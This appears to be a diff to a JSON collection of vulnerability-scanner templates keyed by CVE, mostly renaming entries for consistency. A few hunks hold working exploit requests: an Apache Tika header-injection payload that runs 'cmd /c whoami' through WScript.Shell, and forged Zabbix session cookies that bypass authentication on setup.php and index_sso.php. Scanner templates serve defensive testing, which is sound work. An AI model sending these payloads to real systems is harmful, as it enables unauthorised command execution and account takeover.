@@ -2683,7 +2683,7 @@
     {
       "id": "CVE-2012-4940",
       "info": {
-        "name": "Axigen Mail Server - 'Filename' Directory Traversal",
+        "name": "Axigen Mail Server Filename Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -2779,7 +2779,7 @@
     {
       "id": "CVE-2013-3526",
       "info": {
-        "name": "WordPress Plugin Traffic Analyzer - 'aoid' Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Traffic Analyzer - 'aoid' Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2818,7 +2818,7 @@
     {
       "id": "CVE-2013-4117",
       "info": {
-        "name": "WordPress Plugin Category Grid View Gallery 2.3.1 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Category Grid View Gallery 2.3.1 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2833,7 +2833,7 @@
     {
       "id": "CVE-2013-4625",
       "info": {
-        "name": "WordPress Plugin Duplicator < 0.4.5 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Duplicator < 0.4.5 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2878,7 +2878,7 @@
     {
       "id": "CVE-2013-7091",
       "info": {
-        "name": "Zimbra Collaboration Server 7.2.2/8.0.2 LFI",
+        "name": "Zimbra Collaboration Server 7.2.2/8.0.2 Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -2939,7 +2939,7 @@
     {
       "id": "CVE-2014-2323",
       "info": {
-        "name": "Lighttpd 1.4.34 SQL injection and path traversal",
+        "name": "Lighttpd 1.4.34 SQL Injection and Path Traversal",
         "severity": "critical"
       },
       "requests": [
@@ -2986,7 +2986,7 @@
     {
       "id": "CVE-2014-2962",
       "info": {
-        "name": "Belkin N150 Router 1.00.08/1.00.09 - Directory Traversal",
+        "name": "Belkin N150 Router 1.00.08/1.00.09 - Path Traversal",
         "severity": "high"
       },
       "requests": [
@@ -3030,7 +3030,7 @@
     {
       "id": "CVE-2014-3704",
       "info": {
-        "name": "Drupal Sql Injetion",
+        "name": "Drupal SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -3076,7 +3076,7 @@
     {
       "id": "CVE-2014-4513",
       "info": {
-        "name": "ActiveHelper LiveHelp Server 3.1.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "ActiveHelper LiveHelp Server 3.1.0 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3091,7 +3091,7 @@
     {
       "id": "CVE-2014-4535",
       "info": {
-        "name": "Import Legacy Media <= 0.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "name": "Import Legacy Media <= 0.1 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3106,7 +3106,7 @@
     {
       "id": "CVE-2014-4536",
       "info": {
-        "name": "Infusionsoft Gravity Forms Add-on < 1.5.7 - Unauthenticated Reflected XSS",
+        "name": "Infusionsoft Gravity Forms Add-on < 1.5.7 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3121,7 +3121,7 @@
     {
       "id": "CVE-2014-4539",
       "info": {
-        "name": "Movies <= 0.6 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "name": "Movies <= 0.6 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3136,7 +3136,7 @@
     {
       "id": "CVE-2014-4544",
       "info": {
-        "name": "Podcast Channels < 0.28 - Unauthenticated Reflected XSS",
+        "name": "Podcast Channels < 0.28 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3151,7 +3151,7 @@
     {
       "id": "CVE-2014-4550",
       "info": {
-        "name": "Shortcode Ninja <= 1.4 - Unauthenticated Reflected XSS",
+        "name": "Shortcode Ninja <= 1.4 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3166,7 +3166,7 @@
     {
       "id": "CVE-2014-4558",
       "info": {
-        "name": "WooCommerce Swipe <= 2.7.1 - Unauthenticated Reflected XSS",
+        "name": "WooCommerce Swipe <= 2.7.1 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3181,7 +3181,7 @@
     {
       "id": "CVE-2014-4561",
       "info": {
-        "name": "Ultimate Weather Plugin <= 1.0 - Unauthenticated Reflected XSS",
+        "name": "Ultimate Weather Plugin <= 1.0 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3196,7 +3196,7 @@
     {
       "id": "CVE-2014-4592",
       "info": {
-        "name": "WP Planet <= 0.1 - Unauthenticated Reflected XSS",
+        "name": "WP Planet <= 0.1 - Unauthenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3271,7 +3271,7 @@
     {
       "id": "CVE-2014-6271",
       "info": {
-        "name": "Shellshock",
+        "name": "ShellShock",
         "severity": "critical"
       },
       "requests": [
@@ -3343,7 +3343,7 @@
     {
       "id": "CVE-2014-9094",
       "info": {
-        "name": "WordPress DZS-VideoGallery Plugin Reflected Cross Site Scripting",
+        "name": "WordPress DZS-VideoGallery Plugin Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3358,7 +3358,7 @@
     {
       "id": "CVE-2014-9444",
       "info": {
-        "name": "Frontend Uploader <= 0.9.2 - Unauthenticated Cross-Site Scripting (XSS)",
+        "name": "Frontend Uploader <= 0.9.2 - Unauthenticated Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3373,7 +3373,7 @@
     {
       "id": "CVE-2014-9606",
       "info": {
-        "name": "Netsweeper 4.0.8 - Cross Site Scripting Injection",
+        "name": "Netsweeper 4.0.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3388,7 +3388,7 @@
     {
       "id": "CVE-2014-9607",
       "info": {
-        "name": "Netsweeper 4.0.4 - Cross Site Scripting Injection",
+        "name": "Netsweeper 4.0.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3403,7 +3403,7 @@
     {
       "id": "CVE-2014-9608",
       "info": {
-        "name": "Netsweeper 4.0.3 - Cross Site Scripting Injection",
+        "name": "Netsweeper 4.0.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3447,7 +3447,7 @@
     {
       "id": "CVE-2014-9615",
       "info": {
-        "name": "Netsweeper 4.0.4 - Cross Site Scripting Injection",
+        "name": "Netsweeper 4.0.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6051,11 +6051,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -7218,7 +7218,7 @@
     {
       "id": "CVE-2018-9205",
       "info": {
-        "name": "Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure",
+        "name": "Drupal avatar_uploader v7.x-1.0-beta8 Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -11985,7 +11985,7 @@
     {
       "id": "CVE-2021-20158",
       "info": {
-        "name": "Trendnet AC2600 TEW-827DRU - Unauthenticated Admin Password change",
+        "name": "Trendnet AC2600 TEW-827DRU - Unauthenticated Admin Password Change",
         "severity": "critical"
       },
       "requests": [
@@ -13623,7 +13623,7 @@
     {
       "id": "CVE-2021-29490",
       "info": {
-        "name": "Jellyfin <10.7.2 SSRF",
+        "name": "Jellyfin 10.7.2 SSRF",
         "severity": "medium"
       },
       "requests": [
@@ -15649,8 +15649,32 @@
       },
       "requests": [
         {
-          "raw": [
-            "GET /index_sso.php HTTP/1.1\nHost: {{Hostname}}\nCookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9\n"
+          "headers": {
+            "Cookie": "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
+          },
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/zabbix/index_sso.php",
+            "{{BaseURL}}/index_sso.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-23134",
+      "info": {
+        "name": "Zabbix Setup Configuration - Unauthenticated Access",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Cookie": "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
+          },
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/zabbix/setup.php",
+            "{{BaseURL}}/setup.php"
           ]
         }
       ]
